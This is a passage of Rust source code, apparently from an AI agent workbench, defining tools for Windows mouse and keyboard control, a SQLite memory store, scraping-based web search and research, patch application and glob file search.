    let named = |k: &str| -> Option<&'static str> {
        Some(match k {
            "enter" | "return" => "{ENTER}",
            "esc" | "escape" => "{ESC}",
            "tab" => "{TAB}",
            "space" => " ",
            "backspace" => "{BACKSPACE}",
            "up" => "{UP}",
            "down" => "{DOWN}",
            "left" => "{LEFT}",
            "right" => "{RIGHT}",
            "home" => "{HOME}",
            "end" => "{END}",
            "pageup" | "pgup" => "{PGUP}",
            "pagedown" | "pgdn" => "{PGDN}",
            "insert" | "ins" => "{INSERT}",
            "delete" | "del" => "{DELETE}",
            "capslock" => "{CAPSLOCK}",
            "numlock" => "{NUMLOCK}",
            "scrolllock" => "{SCROLLLOCK}",
            _ => return None,
        })
    };
    // 命名功能键 F1..F12
    if lower.starts_with('f') && lower.len() >= 2 {
        if let Ok(n) = lower[1..].parse::<u8>() {
            if (1..=12).contains(&n) {
                return Some(format!("{{F{n}}}"));
            }
        }
    }
    if let Some(v) = named(&lower) {
        return Some(v.to_string());
    }
    // 组合键：ctrl/alt/shift + 尾键
    let parts: Vec<&str> = lower.split('+').collect();
    if parts.len() > 1 {
        let mut prefix = String::new();
        for p in &parts[..parts.len() - 1] {
            match *p {
                "ctrl" | "control" => prefix.push('^'),
                "alt" => prefix.push('%'),
                "shift" => prefix.push('+'),
                _ => return None,
            }
        }
        let last = parts.last().unwrap();
        let key_part = named(last).unwrap_or(last);
        return Some(format!("{prefix}{key_part}"));
    }
    // 单字符直接发送
    if lower.chars().count() == 1 {
        return Some(lower);
    }
    None
}

fn system_control_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "system_control",
        "系统级鼠标键盘控制（Windows user32/SendInput）：真实操控桌面光标与键盘（第三方软硬件/系统级输入）。action=mouse_move(x,y,humanize?)|mouse_click(x,y?,button,double?)|mouse_scroll(lines,x?,y?)|mouse_pos|screen_size|monitors(多屏坐标枚举)|screenshot(out,monitor?,x?,y?,width?,height?,ocr?)|key_press(key)|type_text(text)。参数: action(必填), x, y, button(left|right|middle), double(0|1), lines, key, text, humanize, out, monitor, width, height, ocr(0|1，截图后 OCR 识别文本+坐标)。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["mouse_move","mouse_click","mouse_scroll","mouse_pos","screen_size","monitors","screenshot","key_press","type_text"]},
            "x":{"type":"number"},
            "y":{"type":"number"},
            "button":{"type":"string","enum":["left","right","middle"]},
            "double":{"type":"number"},
            "lines":{"type":"number","description":"滚动行数（正上负下）"},
            "humanize":{"type":"number","description":"mouse_move 是否拟人化贝塞尔轨迹移动（1 默认；0=直线跳转）"},
            "out":{"type":"string","description":"screenshot 截图输出路径（相对工作区或绝对）"},
            "monitor":{"type":"number","description":"screenshot 目标显示器索引（0 起；缺省=全虚拟屏）"},
            "width":{"type":"number","description":"screenshot 区域宽度（配合 x/y/height 指定区域）"},
            "height":{"type":"number","description":"screenshot 区域高度"},
            "ocr":{"type":"number","description":"screenshot 是否 OCR：1=识别文本并输出每行包围盒坐标"},
            "key":{"type":"string","description":"按键或组合键：enter/esc/tab/up/down/f5/ctrl+c/alt+tab..."},
            "text":{"type":"string","description":"type_text 要输入的文本"}
        },"required":["action"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                if cfg!(not(target_os = "windows")) {
                    return err(
                        "system_control 当前仅支持 Windows（user32 系统级输入）".into(),
                        "NOT_AVAILABLE",
                    );
                }
                let action = args.get("action").cloned().unwrap_or_default();
                if action.trim().is_empty() {
                    return err("system_control 需要非空 action".into(), "INVALID_PARAMS");
                }
                if action == "screenshot" {
                    let out = args.get("out").cloned().unwrap_or_default();
                    std::env::set_var("MARG_SYS_OUT", out);
                }
                if action == "type_text" {
                    let text = args.get("text").cloned().unwrap_or_default();
                    std::env::set_var("MARG_SYS_TEXT", text);
                }
                let ps = match system_control_ps(&action, args) {
                    Ok(p) => p,
                    Err(e) => return err(format!("{e}"), "INVALID_PARAMS"),
                };
                let ps_ref = ps.as_str();
                let mut pscmd = tokio::process::Command::new("powershell");
                pscmd.args(["-NoProfile", "-NonInteractive", "-Command", ps_ref]);
                #[cfg(windows)]
                {
                    pscmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
                }
                let out = match pscmd.output().await
                {
                    Ok(o) => o,
                    Err(e) => return err(format!("启动 PowerShell 失败: {e}"), "SYSTEM_CONTROL_ERROR"),
                };
                if !out.status.success() {
                    let stderr = String::from_utf8_lossy(&out.stderr);
                    return err(
                        format!("system_control 执行失败: {}", stderr.trim()),
                        "SYSTEM_CONTROL_ERROR",
                    );
                }
                let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
                ok(if stdout.is_empty() {
                    format!("{action} 已执行")
                } else {
                    stdout
                })
            })
        }),
    )
}

// ── 记忆层工具（长期经验库：SQLite 持久化 + 语义检索）──
//
// 对齐 Marguerite memory_tools：memory_save 沉淀、memory_search 语义召回、
// memory_list 按类型列举。体验闭环与 self-evolution 台账共用 ExperienceLedger，
// 让「运行过程中的自我训练」可直接被 Agent 工具调用。
fn user_memory_dir() -> PathBuf {
    if let Some(local) = std::env::var_os("LOCALAPPDATA") {
        PathBuf::from(local).join("Marguerite")
    } else {
        std::env::temp_dir().join("marguerite-memory")
    }
}

fn memory_tools(db_path: PathBuf) -> Vec<Box<dyn ToolExecutor>> {
    let save_path = db_path.clone();
    let search_path = db_path.clone();
    let list_path = db_path.clone();
    vec![
        boxed(
            "memory_save",
            "将经验/知识/踩坑沉淀到长期记忆库（SQLite 持久化，同 signature 幂等更新）。参数: body(必填), title, kind=pattern|decision|pitfall, tags(逗号分隔), signature(可选)",
            json!({"type":"object","properties":{
                "body":{"type":"string"},
                "title":{"type":"string"},
                "kind":{"type":"string","enum":["pattern","decision","pitfall"]},
                "tags":{"type":"string"},
                "signature":{"type":"string"}
            },"required":["body"]}),
            Arc::new(move |args| {
                let db_path = save_path.clone();
                Box::pin(async move {
                    if let Some(p) = db_path.parent() {
                        std::fs::create_dir_all(p).ok();
                    }
                    let mut ledger = ExperienceLedger::new(&db_path);
                    ledger.init().map_err(|e| anyhow!("memory init: {e}"))?;
                    let body = args.get("body").cloned().unwrap_or_default();
                    if body.trim().is_empty() {
                        return err("memory_save 需要非空 body".into(), "INVALID_PARAMS");
                    }
                    let kind = ExperienceKind::from_kind_str(args.get("kind").map(String::as_str).unwrap_or("pattern"));
                    let title = args.get("title").cloned().unwrap_or_else(|| "未命名经验".into());
                    let tags: Vec<String> = args
                        .get("tags")
                        .cloned()
                        .unwrap_or_default()
                        .split(',')
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                        .collect();
                    let sig = args.get("signature").cloned().unwrap_or_default();
                    let id = ledger.record(kind, &title, &body, &tags, &sig)?;
                    ok(format!("已沉淀记忆条目 #{id}（{}）：{title}", kind.as_str()))
                })
            }),
        ),
        boxed(
            "memory_search",
            "语义检索长期记忆库（向量相似度，低于阈值视为无相关）。参数: query(必填), limit(默认5)",
            json!({"type":"object","properties":{"query":{"type":"string"},"limit":{"type":"number"}},"required":["query"]}),
            Arc::new(move |args| {
                let db_path = search_path.clone();
                Box::pin(async move {
                    if let Some(p) = db_path.parent() {
                        std::fs::create_dir_all(p).ok();
                    }
                    let mut ledger = ExperienceLedger::new(&db_path);
                    ledger.init().map_err(|e| anyhow!("memory init: {e}"))?;
                    let query = args.get("query").cloned().unwrap_or_default();
                    if query.trim().is_empty() {
                        return err("memory_search 需要非空 query".into(), "INVALID_PARAMS");
                    }
                    let limit: usize = args.get("limit").and_then(|l| l.parse().ok()).unwrap_or(5);
                    let hits = ledger.search(&query, limit)?;
                    if hits.is_empty() {
                        return ok("未检索到相关记忆".into());
                    }
                    let out = hits
                        .iter()
                        .map(|e| {
                            let tags = if e.tags.is_empty() { "-".to_string() } else { e.tags.join(",") };
                            format!("[{}] {} ({})\n  {}", e.kind.as_str(), e.title, e.id, e.body)
                                + &format!("\n  tags: {tags}")
                        })
                        .collect::<Vec<_>>()
                        .join("\n---\n");
                    ok(out)
                })
            }),
        ),
        boxed(
            "memory_list",
            "按类型列出长期记忆（最新在前）。参数: kind=pattern|decision|pitfall(必填), limit(默认20)",
            json!({"type":"object","properties":{"kind":{"type":"string","enum":["pattern","decision","pitfall"]},"limit":{"type":"number"}},"required":["kind"]}),
            Arc::new(move |args| {
                let db_path = list_path.clone();
                Box::pin(async move {
                    if let Some(p) = db_path.parent() {
                        std::fs::create_dir_all(p).ok();
                    }
                    let mut ledger = ExperienceLedger::new(&db_path);
                    ledger.init().map_err(|e| anyhow!("memory init: {e}"))?;
                    let kind = ExperienceKind::from_kind_str(args.get("kind").map(String::as_str).unwrap_or("pattern"));
                    let limit: usize = args.get("limit").and_then(|l| l.parse().ok()).unwrap_or(20);
                    let items = ledger.list_by_kind(kind, limit)?;
                    if items.is_empty() {
                        return ok(format!("暂无 {} 类型记忆", kind.as_str()));
                    }
                    let out = items
                        .iter()
                        .map(|e| format!("[{}] {} | {} (validated={})", e.kind.as_str(), e.title, e.body, e.validated))
                        .collect::<Vec<_>>()
                        .join("\n");
                    ok(out)
                })
            }),
        ),
    ]
}

// ── 全程联网：轻量 web_search（DDG 主引擎 + Bing 回退，零 API key）──
//
// 对齐 Marguerite/gwwc 的 web_search：无 key 场景下以 DuckDuckGo HTML 为主引擎，
// 空结果/失败时回退 Bing HTML 第二引擎；检索结果（标题+链接+摘要）供 Agent 快速
// 发现信息，再配合 web_fetch 深读正文。
/// 多引擎联网检索（DDG 主 + Bing 回退，无需 API key）。返回结构化结果。
/// 失败时返回 Err(可读原因)，供上层回退/报错。
async fn run_web_search(q: &str, max: usize) -> Result<Vec<SearchResult>, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .build()
        .unwrap_or_default();
    let ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36";
    // 主引擎：DuckDuckGo HTML
    let mut ddg_error = String::new();
    let mut ddg_results: Vec<SearchResult> = Vec::new();
    match client
        .post("https://html.duckduckgo.com/html/")
        .form(&[("q", q.to_string())])
        .header("User-Agent", ua)
        .send()
        .await
    {
        Ok(r) => {
            if let Ok(html) = r.text().await {
                ddg_results = parse_ddg_results(&html, max);
            }
        }
        Err(e) => ddg_error = e.to_string(),
    }
    if !ddg_results.is_empty() {
        return Ok(ddg_results);
    }
    // 回退引擎：Bing HTML（DDG 空结果或请求失败均触发）
    let mut bing_error = String::new();
    let mut results: Vec<SearchResult> = Vec::new();
    match client
        .get("https://www.bing.com/search")
        .query(&[("q", q.to_string())])
        .header("User-Agent", ua)
        .send()
        .await
    {
        Ok(r) => {
            if let Ok(bhtml) = r.text().await {
                results = parse_bing_results(&bhtml, max);
            }
        }
        Err(e) => bing_error = e.to_string(),
    }
    if results.is_empty() {
        let detail = if !ddg_error.is_empty() {
            format!("DuckDuckGo: {ddg_error}")
        } else {
            "DuckDuckGo: 无结果".to_string()
        };
        let detail = if !bing_error.is_empty() {
            format!("{detail}; Bing: {bing_error}")
        } else {
            format!("{detail}; Bing: 无结果")
        };
        return Err(format!("联网搜索不可用（多引擎均无返回）: {detail}"));
    }
    Ok(results)
}

/// 格式化搜索结果（每条约 3 行：标题 / 链接 / 摘要）
fn format_search_results(results: &[SearchResult]) -> String {
    results
        .iter()
        .enumerate()
        .map(|(i, r)| {
            let url = r.url.as_deref().unwrap_or("（无链接）");
            format!("{}. {} ({url})\n   {}", i + 1, r.title, r.snippet)
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn web_search_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "web_search",
        "联网搜索（DuckDuckGo 主引擎 + Bing 回退，无需 API key）。返回 标题/链接/摘要 结构化结果。参数: q(必填), max_results(默认5)",
        json!({"type":"object","properties":{"q":{"type":"string"},"max_results":{"type":"number"}},"required":["q"]}),
        Arc::new(move |args| {
            Box::pin(async move {
                let q = args.get("q").cloned().unwrap_or_default();
                if q.trim().is_empty() {
                    return err("web_search 需要非空 q".into(), "INVALID_PARAMS");
                }
                let max: usize = args.get("max_results").and_then(|m| m.parse().ok()).unwrap_or(5).min(10);
                match run_web_search(&q, max).await {
                    Ok(results) => ok(format_search_results(&results)),
                    Err(detail) => err(detail, "NET_ERROR"),
                }
            })
        }),
    )
}

/// 联网检索升级：search → 自动抓取前 N 条正文 → 汇总摘要（一次调用完成「检索+深读」）。
/// 对齐主流工作台（上游工作台的 search-then-read）能力，弥补单一搜索只有标题/摘要的不足。
fn web_research_tool(ssrf: Arc<SsrfGuard>) -> Box<dyn ToolExecutor> {
    boxed(
        "web_research",
        "联网检索+深读：搜索 query，自动抓取前 max_read 条结果的正文（readability 提取），返回结构化研究摘要。参数: q(必填), max_results(可选,默认5), max_read(可选,默认3), max_chars(可选,默认4000/条)",
        json!({
            "type": "object",
            "properties": {
                "q": {"type": "string"},
                "max_results": {"type": "number"},
                "max_read": {"type": "number"},
                "max_chars": {"type": "number"}
            },
            "required": ["q"]
        }),
        Arc::new(move |args| {
            let ssrf = ssrf.clone();
            Box::pin(async move {
                let q = args.get("q").cloned().unwrap_or_default();
                if q.trim().is_empty() {
                    return err("web_research 需要非空 q".into(), "INVALID_PARAMS");
                }
                let max_results: usize = args.get("max_results").and_then(|m| m.parse().ok()).unwrap_or(5).min(10);
                let max_read: usize = args.get("max_read").and_then(|m| m.parse().ok()).unwrap_or(3).min(8);
                let max_chars: usize = args.get("max_chars").and_then(|m| m.parse().ok()).unwrap_or(4000).min(20000);
                let results = match run_web_search(&q, max_results).await {
                    Ok(rs) => rs,
                    Err(detail) => return err(detail, "NET_ERROR"),
                };
                if results.is_empty() {
                    return ok("搜索无结果，未能读取任何正文。".to_string());
                }
                let client = reqwest::Client::builder()
                    .timeout(Duration::from_secs(20))
                    .build()
                    .unwrap_or_default();
                let mut digest = Vec::new();
                let mut fetched = 0usize;
                for (i, r) in results.iter().enumerate() {
                    if fetched >= max_read {
                        break;
                    }
                    let url = match r.url.as_deref() {
                        Some(u) if !u.is_empty() => u,
                        _ => continue,
                    };
                    if let Err(e) = ssrf.check(url) {
                        digest.push(format!("{}. {} — 跳过（SSRF:{e}）", i + 1, r.title));
                        continue;
                    }
                    let body = match client.get(url).send().await {
                        Ok(resp) if resp.status().is_success() => match resp.text().await {
                            Ok(t) => {
                                fetched += 1;
                                if looks_like_html(&t) {
                                    extract_readable(&t, max_chars)
                                } else {
                                    t.chars().take(max_chars).collect()
                                }
                            }
                            Err(_) => {
                                digest.push(format!("{}. {} — 读取失败", i + 1, r.title));
                                continue;
                            }
                        },
                        _ => {
                            digest.push(format!("{}. {} — 状态异常", i + 1, r.title));
                            continue;
                        }
                    };
                    digest.push(format!(
                        "### {}\n来源: {}\n摘要: {}\n正文摘录:\n{}\n",
                        i + 1,
                        url,
                        if r.snippet.is_empty() { "（无）" } else { &r.snippet },
                        body
                    ));
                }
                if digest.is_empty() {
                    return ok(format_search_results(&results));
                }
                ok(format!("【检索: {}】共 {} 条结果，深读 {} 条。\n\n{}", q, results.len(), fetched, digest.join("\n")))
            })
        }),
    )
}

/// 从 `haystack[from..]` 中安全提取 `attr="…"` 值（find 定位，避免按字节切片落入多字节字符）
fn extract_attr_from(haystack: &str, from: usize, attr: &str) -> Option<String> {
    let key = format!("{attr}=\"");
    let rel = haystack[from..].find(&key)?;
    let s = from + rel + key.len();
    let end = haystack[s..].find('"')? + s;
    Some(haystack[s..end].to_string())
}

/// 单条搜索结果（结构化，供 Agent 精确取链接深读）
#[derive(Debug, Clone)]
struct SearchResult {
    title: String,
    url: Option<String>,
    snippet: String,
}

/// 从 Bing HTML 响应中提取 (标题, 链接, 摘要) 列表（轻量子串解析，零依赖）
fn parse_bing_results(html: &str, max: usize) -> Vec<SearchResult> {
    fn strip_tags(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut in_tag = false;
        for c in s.chars() {
            match c {
                '<' => in_tag = true,
                '>' => in_tag = false,
                _ if !in_tag => out.push(c),
                _ => {}
            }
        }
        out.replace("&amp;", "&")
            .replace("&quot;", "\"")
            .replace("&#39;", "'")
    }
    let mut out = Vec::new();
    for block in html.split("class=\"b_algo\"") {
        if out.len() >= max {
            break;
        }
        // 标题锚点：<h2><a href="…">title</a></h2>
        let Some(h2) = block.find("<h2") else {
            continue;
        };
        let Some(anchor) = block[h2..].find("<a") else {
            continue;
        };
        let a_start = h2 + anchor;
        let href = extract_attr_from(block, a_start, "href").map(|h| h.replace("&amp;", "&"));
        let Some(title_start) = block[a_start..].find('>') else {
            continue;
        };
        let t_start = a_start + title_start + 1;
        let Some(title_end) = block[t_start..].find("</a>") else {
            continue;
        };
        let title = strip_tags(&block[t_start..t_start + title_end]);
        // 摘要：块内首个 <p>…</p>
        let snippet = block
            .find("<p")
            .and_then(|i| block[i..].find('>').map(|j| i + j + 1))
            .and_then(|start| {
                block[start..]
                    .find("</p>")
                    .map(|end| strip_tags(&block[start..start + end]))
            })
            .unwrap_or_default();
        out.push(SearchResult {
            title,
            url: href,
            snippet,
        });
    }
    out
}

/// 从 DuckDuckGo HTML 响应中提取 (标题, 链接, 摘要) 列表（轻量子串解析，零依赖）
fn parse_ddg_results(html: &str, max: usize) -> Vec<SearchResult> {
    fn strip_tags(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut in_tag = false;
        for c in s.chars() {
            match c {
                '<' => in_tag = true,
                '>' => in_tag = false,
                _ if !in_tag => out.push(c),
                _ => {}
            }
        }
        out.replace("&amp;", "&")
            .replace("&quot;", "\"")
            .replace("&#x27;", "'")
    }
    let mut out = Vec::new();
    for block in html.split("class=\"result__body\"") {
        if out.len() >= max {
            break;
        }
        let Some(a_start) = block.find("class=\"result__a\"") else {
            continue; // 无标题锚点的块（如"无结果"提示）跳过
        };
        let snippet_start = block.find("class=\"result__snippet\"");
        let title = block[a_start..]
            .find('>')
            .and_then(|j| {
                let start = a_start + j + 1;
                block[start..]
                    .find("</a>")
                    .map(|end| strip_tags(&block[start..start + end]))
            })
            .unwrap_or_else(|| "（无标题）".into());
        let snippet = snippet_start
            .and_then(|i| block[i..].find('>').map(|j| i + j + 1))
            .and_then(|start| {
                block[start..]
                    .find("</a>")
                    .map(|end| strip_tags(&block[start..start + end]))
            })
            .unwrap_or_default();
        let href = extract_attr_from(block, a_start, "href").map(|h| h.replace("&amp;", "&"));
        out.push(SearchResult {
            title,
            url: href,
            snippet,
        });
    }
    out
}

fn json_query_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "json_query",
        "从 JSON 文本中按点分路径提取值（支持数组下标）。参数: json, path(如 a.b.0.c)",
        json!({"type":"object","properties":{"json":{"type":"string"},"path":{"type":"string"}}}),
        Arc::new(move |args| {
            Box::pin(async move {
                let js = args.get("json").ok_or_else(|| anyhow!("missing 'json'"))?;
                let path = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                match json_query(js, path) {
                    Ok(v) => ok(v),
                    Err(e) => err(e.to_string(), "QUERY_ERROR"),
                }
            })
        }),
    )
}

fn diff_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "diff",
        "计算两段文本的行级 diff。参数: old, new",
        json!({"type":"object","properties":{"old":{"type":"string"},"new":{"type":"string"}}}),
        Arc::new(move |args| {
            Box::pin(async move {
                let old = args.get("old").ok_or_else(|| anyhow!("missing 'old'"))?;
                let new = args.get("new").ok_or_else(|| anyhow!("missing 'new'"))?;
                ok(diff_lines(old, new))
            })
        }),
    )
}

fn count_lines_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "count_lines",
        "统计文件行数。参数: path",
        json!({"type":"object","properties":{"path":{"type":"string"}}}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let p = args.get("path").ok_or_else(|| anyhow!("missing 'path'"))?;
                let abs = safe_resolve(&ws, p)?;
                if !abs.is_file() {
                    return err(format!("not a file: {}", p), "NOT_FOUND");
                }
                let content = std::fs::read_to_string(&abs)?;
                ok(format!("{} lines in {}", content.lines().count(), p))
            })
        }),
    )
}

fn read_env_tool() -> Box<dyn ToolExecutor> {
    boxed(
        "read_env",
        "读取指定环境变量的值（仅当前进程环境）。参数: name",
        json!({"type":"object","properties":{"name":{"type":"string"}}}),
        Arc::new(move |args| {
            Box::pin(async move {
                let name = args.get("name").ok_or_else(|| anyhow!("missing 'name'"))?;
                match std::env::var(name) {
                    Ok(v) => ok(v),
                    Err(_) => err(format!("env var not set: {}", name), "NOT_FOUND"),
                }
            })
        }),
    )
}

// ---------------------------------------------------------------------------
// 上游等价工具（二开）：apply_patch / glob_file_search / todo_write
//
// 对齐上游 CLI 核心工具面中本工作台此前缺失的三件套：
// - `apply_patch`：统一 diff 补丁应用（上游的「major lever」，比单串替换
//   `edit_file` 更强：一个补丁可精确改动多处、支持新增/删除整行块）。
// - `glob_file_search`：glob 模式文件检索（`find_files` 只做名字子串，glob 支持
//   `**`/`*`/`?` 通配，更贴近「按模式定位」的真实检索需求）。
// - `todo_write`：结构化任务清单（对齐上游 todo_write/update_plan，让 Agent
//   在长任务中自报进度，落盘 .marguerite/todos.json 可跨轮读取）。
// ---------------------------------------------------------------------------

/// 补丁 hunk 内的单行（上下文 / 删除 / 新增）
enum HunkLine {
    Ctx(String),
    Del(String),
    Add(String),
}

/// 一个 `@@ -a,b +c,d @@` hunk
struct Hunk {
    old_start: usize,
    body: Vec<HunkLine>,
}

/// 解析 hunk 头 `@@ -1,3 +1,3 @@` → (old_start, old_count, new_start, new_count)
fn parse_hunk_header(line: &str) -> Result<(usize, usize, usize, usize)> {
    let s = line.trim().trim_start_matches('@').trim();
    let parts: Vec<&str> = s.split_whitespace().collect();
    if parts.len() < 2 {
        return Err(anyhow!("无效 hunk 头: {line}"));
    }
    let old = parse_hunk_range(parts[0].trim_start_matches('-'))?;
    let new = parse_hunk_range(parts[1].trim_start_matches('+'))?;
    Ok((old.0, old.1, new.0, new.1))
}

/// 解析 `a,b` 或 `a` → (start, count)
fn parse_hunk_range(s: &str) -> Result<(usize, usize)> {
    if let Some((a, b)) = s.split_once(',') {
        Ok((a.parse()?, b.parse()?))
    } else {
        Ok((s.parse()?, 1usize))
    }
}

/// 在 `haystack` 中定位 `needle` 子序列：优先从 `start` 精确匹配，失败则线性扫描。
fn locate_sequence(haystack: &[String], needle: &[String], start: usize) -> Option<usize> {
    if needle.is_empty() {
        return Some(start.min(haystack.len()));
    }
    let start = start.min(haystack.len());
    if start + needle.len() <= haystack.len() && &haystack[start..start + needle.len()] == needle {
        return Some(start);
    }
    (0..=haystack.len().saturating_sub(needle.len()))
        .find(|&i| &haystack[i..i + needle.len()] == needle)
}

/// 应用 unified diff 补丁到文件内容，返回 (新内容, 已应用 hunk 数)。
///
/// 只处理 `@@` hunk（`---`/`+++` 头与 `\ No newline` 等辅助行由调用方剥离或忽略）。
fn apply_hunks(content: &str, patch: &str) -> Result<(String, usize)> {
    let lines: Vec<&str> = patch.lines().collect();
    let mut hunks: Vec<Hunk> = Vec::new();
    let mut i = 0usize;
    while i < lines.len() {
        if lines[i].starts_with("@@") {
            let (old_start, _old_count, _new_start, _new_count) = parse_hunk_header(lines[i])?;
            let mut body = Vec::new();
            i += 1;
            while i < lines.len() && !lines[i].starts_with("@@") {
                let l = lines[i];
                if let Some(rest) = l.strip_prefix('+') {
                    if !rest.starts_with('+') {
                        body.push(HunkLine::Add(rest.to_string()));
                    }
                } else if let Some(rest) = l.strip_prefix('-') {
                    if !rest.starts_with('-') {
                        body.push(HunkLine::Del(rest.to_string()));
                    }
                } else if let Some(rest) = l.strip_prefix(' ') {
                    body.push(HunkLine::Ctx(rest.to_string()));
                }
                i += 1;
            }
            hunks.push(Hunk { old_start, body });
        } else {
            i += 1;
        }
    }
    if hunks.is_empty() {
        return Err(anyhow!("补丁中未找到任何 @@ hunk 头"));
    }

    let mut cur: Vec<String> = content.lines().map(|s| s.to_string()).collect();
    let mut offset: isize = 0;
    let mut applied = 0usize;
    for hunk in &hunks {
        let old_lines: Vec<String> = hunk
            .body
            .iter()
            .filter_map(|l| match l {
                HunkLine::Ctx(s) | HunkLine::Del(s) => Some(s.clone()),
                HunkLine::Add(_) => None,
            })
            .collect();
        let new_lines: Vec<String> = hunk
            .body
            .iter()
            .filter_map(|l| match l {
                HunkLine::Ctx(s) | HunkLine::Add(s) => Some(s.clone()),
                HunkLine::Del(_) => None,
            })
            .collect();
        let start = (hunk.old_start as isize - 1 + offset).max(0) as usize;
        let pos = locate_sequence(&cur, &old_lines, start).ok_or_else(|| {
            anyhow!(
                "hunk 上下文不匹配（old_start={}），无法应用补丁",
                hunk.old_start
            )
        })?;
        let end = pos + old_lines.len();
        let mut next: Vec<String> =
            Vec::with_capacity(cur.len() - old_lines.len() + new_lines.len());
        next.extend_from_slice(&cur[..pos]);
        next.extend(new_lines.iter().cloned());
        next.extend_from_slice(&cur[end..]);
        offset += new_lines.len() as isize - old_lines.len() as isize;
        cur = next;
        applied += 1;
    }
    Ok((cur.join("\n"), applied))
}

/// 从补丁文本提取 `+++ b/...` 或 `+++ a/...` 头中的目标路径（无则 None）。
fn patch_target_path(patch: &str) -> Option<String> {
    patch.lines().find_map(|l| {
        let rest = l.strip_prefix("+++ ")?.trim();
        let rest = rest
            .strip_prefix("b/")
            .or_else(|| rest.strip_prefix("a/"))
            .unwrap_or(rest);
        Some(rest.to_string())
    })
}

fn apply_patch_tool(
    workspace: PathBuf,
    versions: Arc<Option<VersionManager>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "apply_patch",
        "应用 unified diff 补丁到工作区文件（对齐上游 apply_patch）。patch 为包含 @@ hunk 头的补丁文本，可含 +++ b/path 头；若省略头则需显式 path。参数: patch(必填), path(可选，补丁含 +++ 头时可省略)",
        json!({"type":"object","properties":{
            "patch":{"type":"string"},
            "path":{"type":"string"}
        },"required":["patch"]}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            let versions = versions.clone();
            Box::pin(async move {
                let patch = args.get("patch").ok_or_else(|| anyhow!("missing 'patch'"))?;
                let header = patch_target_path(patch);
                let p = args
                    .get("path")
                    .map(|s| s.as_str())
                    .or(header.as_deref())
                    .ok_or_else(|| anyhow!("missing 'path'（且补丁无 +++ 头）"))?;
                let abs = safe_resolve(&ws, p)?;
                let existed = abs.is_file();
                let old_content = if existed {
                    std::fs::read_to_string(&abs)?
                } else {
                    String::new()
                };
                let (new_content, applied) = apply_hunks(&old_content, patch)?;
                // L3 路径边界 + L2 内容扫描：补丁引入的新内容必须过护栏。
                if let Some(denied) = gate(&PREFLIGHT.check_write(&abs, &normalize_workspace(&ws), &new_content)) {
                    return denied;
                }
                if let Some(parent) = abs.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                if let Some(vm) = versions.as_ref() {
                    if abs.exists() {
                        let _ = vm.snapshot_file(&abs);
                    }
                }
                std::fs::write(&abs, &new_content)?;
                crate::tools::file_change::record_file_change(
                    p,
                    if existed { "modify" } else { "create" },
                    &old_content,
                    &new_content,
                    "apply_patch",
                );
                ok(format!("已应用 {applied} 个 hunk 到 {p}"))
            })
        }),
    )
}

/// 单段 glob 匹配（`*` 任意字符、`?` 单字符，带回溯）
fn segment_glob_match(pat: &str, s: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let t: Vec<char> = s.chars().collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let mut star: Option<(usize, usize)> = None;
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some((pi, ti));
            pi += 1;
        } else if let Some((sp, st)) = star {
            pi = sp + 1;
            ti = st + 1;
            star = Some((sp, st + 1));
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// 跨段 glob 匹配（支持 `**` 匹配零个或多个目录段）
fn glob_segments_match(pat: &[&str], path: &[&str]) -> bool {
    if pat.is_empty() {
        return path.is_empty();
    }
    if pat[0] == "**" {
        if glob_segments_match(&pat[1..], path) {
            return true;
        }
        if !path.is_empty() && glob_segments_match(pat, &path[1..]) {
            return true;
        }
        return false;
    }
    if path.is_empty() {
        return false;
    }
    if segment_glob_match(pat[0], path[0]) {
        return glob_segments_match(&pat[1..], &path[1..]);
    }
    false
}

/// 顶层 glob 匹配：按 `/` 分段，`**` 跨段、`*`/`?` 段内。
fn glob_matches(pattern: &str, path: &str) -> bool {
    let pat: Vec<&str> = pattern.split('/').collect();
    let segs: Vec<&str> = path.split('/').collect();
    glob_segments_match(&pat, &segs)
}

fn glob_file_search_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "glob_file_search",
        "按 glob 模式检索工作区文件（支持 *、**、? 通配，如 '**/*.rs'、'src/*.ts'）。参数: pattern(必填), max(可选，默认200)",
        json!({"type":"object","properties":{"pattern":{"type":"string"},"max":{"type":"number"}},"required":["pattern"]}),
        Arc::new(move |args| {
            let ws = workspace.clone();
            Box::pin(async move {
                let pattern = args.get("pattern").ok_or_else(|| anyhow!("missing 'pattern'"))?;
                let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(200);
                let mut all = Vec::new();
                walk_files(&ws, &mut all);
                let mut hits: Vec<String> = all
                    .iter()
                    .filter_map(|p| {
                        let rel = p
                            .strip_prefix(&ws)
                            .unwrap_or(p)
                            .to_string_lossy()
                            .replace('\\', "/");
                        if glob_matches(pattern, &rel) { Some(rel) } else { None }
                    })
                    .take(max)
                    .collect();
                hits.sort();
                ok(format!("匹配 {} 个文件:\n{}", hits.len(), hits.join("\n")))
            })
        }),
    )
}

fn todo_write_tool(workspace: PathBuf) -> Box<dyn ToolExecutor> {
    boxed(
        "todo_write",
